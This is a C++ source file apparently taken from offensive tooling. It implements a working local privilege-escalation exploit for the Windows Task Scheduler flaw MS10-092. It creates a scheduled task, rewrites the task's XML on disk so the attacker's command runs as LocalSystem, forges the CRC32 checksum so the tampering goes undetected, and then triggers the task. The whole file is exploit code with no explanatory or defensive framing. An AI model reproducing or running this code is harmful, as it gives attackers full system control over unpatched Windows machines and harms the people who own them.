#include <windows.h>
#include <stdio.h>
#include <shlwapi.h>
#include <shlobj.h>
#include <comdef.h>
#include <taskschd.h>
#include <initguid.h>
#include <ole2.h>
#include <mstask.h>
#include <msterr.h>
#include <objidl.h>

#pragma comment(lib,"taskschd.lib")
#pragma comment(lib,"comsupp.lib")
#pragma comment(lib,"imagehlp.lib")

#include "ntdll.h"
#include "utils.h"

VOID WINAPI _com_issue_error(HRESULT){}

WCHAR ExpFmt[] = 
{
	L"  <Principals>\r\n"\
	L"    <Principal id=\"LocalSystem\">\r\n"\
	L"      <UserId>S-1-5-18</UserId>\r\n"\
	L"      <RunLevel>HighestAvailable</RunLevel>\r\n"\
	L"    </Principal>\r\n"\
	L"  </Principals>\r\n"\
	L"  <Actions Context=\"LocalSystem\">\r\n"\
	L"    <Exec>\r\n"\
	L"      <Command>%S</Command>\r\n"\
	L"    </Exec>\r\n"\
	L"  </Actions>\r\n"\
	L"</Task>"
};

WCHAR wszComment[] = L"\r\n<!--\0\0-->\r\n";

BOOL BypassUACTaskSchChangeXML(LPCWSTR wszTaskPath,LPCSTR lpPath)
{
	BOOL bRet = FALSE;
	HANDLE hFile;
	DWORD t;
	
	hFile = CreateFileW(wszTaskPath,GENERIC_READ|GENERIC_WRITE,FILE_SHARE_READ|FILE_SHARE_WRITE,NULL,OPEN_EXISTING,FILE_ATTRIBUTE_NORMAL,0);
	if (hFile != INVALID_HANDLE_VALUE)
	{
		DWORD dwSize = GetFileSize(hFile,NULL);
		if (dwSize)
		{
			DWORD AppendSize = strlen(lpPath)*2 + sizeof(ExpFmt) + sizeof(wszComment);
			PWCHAR Buffer = (PWCHAR)malloc(dwSize + AppendSize);
			if (Buffer)
			{
				if (ReadFile(hFile,Buffer,dwSize,&t,NULL))
				{
					DWORD dwReadCrc32 = ~RtlComputeCrc32(0,(PUCHAR)Buffer+2,dwSize-2);
					
					PWCHAR lpwszAppendix = (PWCHAR)malloc(AppendSize);
					if (lpwszAppendix)
					{
						AppendSize = _snwprintf(lpwszAppendix,(AppendSize/2)-1,ExpFmt,lpPath)*2;
						PWCHAR lpwszActions = wcsstr(Buffer,L"<Actions ");
						if (lpwszActions)
						{
							CopyMemory(lpwszActions,lpwszAppendix,AppendSize);
							dwSize = (DWORD)lpwszActions - (DWORD)Buffer + AppendSize;
							CopyMemory((PUCHAR)Buffer + dwSize,wszComment,sizeof(wszComment)-2);

							DWORD Count = dwSize + 10;
							dwSize += sizeof(wszComment)-2;

							LONG dwNewCrc32 = dwReadCrc32 ^ ~RtlComputeCrc32(0,(PUCHAR)Buffer+2,dwSize-2);
							Count = 8 * (dwSize-2 - Count);
							while (Count)
							{
								Count--;
								if (dwNewCrc32 >= 0) dwNewCrc32 *= 2; else dwNewCrc32 = 2 * dwNewCrc32 ^ 0xDB710641;
							}

							*(PLONG)((PUCHAR)Buffer + dwSize - sizeof(L"-->\r\n")-2) = dwNewCrc32;

							SetFilePointer(hFile,0,0,FILE_BEGIN);

							if (WriteFile(hFile,Buffer,dwSize,&t,NULL))
							{
								bRet = TRUE;

								SetEndOfFile(hFile);
							}
						}

						free(lpwszAppendix);
					}
				}
				else
				{
					DbgPrint(__FUNCTION__"(): ReadFile failed with error %x\n",GetLastError());
				}

				free(Buffer);
			}
		}

		CloseHandle(hFile);
	}
	else
	{
		DbgPrint(__FUNCTION__"(): CreateFileW failed with error %x\n",GetLastError());
	}

	return bRet;
}

BOOL ExploitMS10_092(LPCSTR lpPath)
{
	BOOL bRet = FALSE;
	HRESULT Hr;

	DbgPrint(__FUNCTION__"(): start\n");

	Hr = CoInitializeEx(NULL,COINIT_MULTITHREADED);
	if (SUCCEEDED(Hr))
	{	
		Hr = CoInitializeSecurity(NULL,-1,NULL,NULL,RPC_C_AUTHN_LEVEL_PKT_PRIVACY,RPC_C_IMP_LEVEL_IMPERSONATE,NULL,0,NULL);
		if (SUCCEEDED(Hr))
		{
			ITaskService *pService = NULL;

			Hr = CoCreateInstance(CLSID_TaskScheduler,NULL,CLSCTX_INPROC_SERVER,IID_ITaskService,(PVOID*)&pService);  
			if (SUCCEEDED(Hr))
			{
				Hr = pService->Connect(_variant_t(),_variant_t(),_variant_t(),_variant_t());
				if (SUCCEEDED(Hr))
				{
					ITaskFolder *pRootFolder;

					Hr = pService->GetFolder(_bstr_t(L"\\"),&pRootFolder);
					if (SUCCEEDED(Hr))
					{
						WCHAR wszTaskPath[MAX_PATH];

						_snwprintf(wszTaskPath,RTL_NUMBER_OF(wszTaskPath)-1,L"\\\\?\\globalroot\\systemroot\\system32\\tasks\\%x",GetTickCount()^GetCurrentProcessId());

						LPCWSTR wszTaskName = PathFindFileNameW(wszTaskPath);
						pRootFolder->DeleteTask(_bstr_t(wszTaskName),0);

						ITaskDefinition *pTask;
					
						Hr = pService->NewTask(0,&pTask);
						if (SUCCEEDED(Hr))
						{
							IActionCollection *pActionCollection;

							Hr = pTask->get_Actions(&pActionCollection);
							if (SUCCEEDED(Hr))
							{
								IAction *pAction = NULL;

								Hr = pActionCollection->Create(TASK_ACTION_EXEC,&pAction);
								if (SUCCEEDED(Hr))
								{
									IExecAction *pExecAction;

									Hr = pAction->QueryInterface(IID_IExecAction,(PVOID*)&pExecAction);
									if (SUCCEEDED(Hr))
									{
										Hr = pExecAction->put_Path(_bstr_t(L"cmd.exe"));
										if (SUCCEEDED(Hr))
										{
											Hr = pExecAction->put_Arguments(_bstr_t(L""));
											if (SUCCEEDED(Hr))
											{
												IRegisteredTask	*pRegisteredTask;
												
												Hr = pRootFolder->RegisterTaskDefinition(_bstr_t(wszTaskName),pTask,TASK_CREATE_OR_UPDATE,_variant_t(),_variant_t(),TASK_LOGON_INTERACTIVE_TOKEN,_variant_t(L""),&pRegisteredTask);
												if (SUCCEEDED(Hr))
												{
													if (BypassUACTaskSchChangeXML(wszTaskPath,lpPath))
													{
														Hr = pRegisteredTask->put_Enabled(VARIANT_FALSE);
														if (SUCCEEDED(Hr)) 
														{
															Hr = pRegisteredTask->put_Enabled(VARIANT_TRUE);
															if (SUCCEEDED(Hr))
															{
																Hr = pRegisteredTask->Run(variant_t(),NULL);
																if (SUCCEEDED(Hr)) 
																{
																	bRet = TRUE;
																}
																else
																{
																	DbgPrint(__FUNCTION__"(): Run failed with error %x\n",Hr);
																}
															}
															else
															{
																DbgPrint(__FUNCTION__"(): put_Enabled failed with error %x\n",Hr);
															}
														}			
														else
														{
															DbgPrint(__FUNCTION__"(): put_Enabled failed with error %x\n",Hr);
														}
													}

													pRegisteredTask->Release();
												}
												else
												{
													DbgPrint(__FUNCTION__"(): RegisterTaskDefinition failed with error %x\n",Hr);
												}
											}
											else
											{
												DbgPrint(__FUNCTION__"(): put_Arguments failed with error %x\n",Hr);
											}
										}
										else
										{
											DbgPrint(__FUNCTION__"(): put_Path failed with error %x\n",Hr);
										}
											
										pExecAction->Release();
									}
									else
									{
										DbgPrint(__FUNCTION__"(): QueryInterface failed with error %x\n",Hr);
									}

									pAction->Release();
								}

								pActionCollection->Release();
							}
							else
							{
								DbgPrint(__FUNCTION__"(): get_Actions failed with error %x\n",Hr);	
							}
							
							pTask->Release();
						}
						else
						{
							DbgPrint(__FUNCTION__"(): NewTask failed with error %x\n",Hr);
						}

						if (!bRet) pRootFolder->DeleteTask(_bstr_t(wszTaskName),0);
					
						pRootFolder->Release();
					}
				}
				else
				{
					DbgPrint(__FUNCTION__"(): Connect failed with error %x\n",Hr);
				}
			
				pService->Release();
			}
			else
			{
				DbgPrint(__FUNCTION__"(): CoCreateInstance failed with error %x\n",Hr);
			}
		}
		else
		{
			DbgPrint(__FUNCTION__"(): CoInitializeSecurity failed with error %x\n",Hr);
		}
		
		CoUninitialize();
	}
	else
	{
		DbgPrint(__FUNCTION__"(): CoInitializeEx failed with error %x\n",Hr);
	}

	DbgPrint(__FUNCTION__"(): %s\n",bRet ? "OK" : "failed");

	return bRet;
}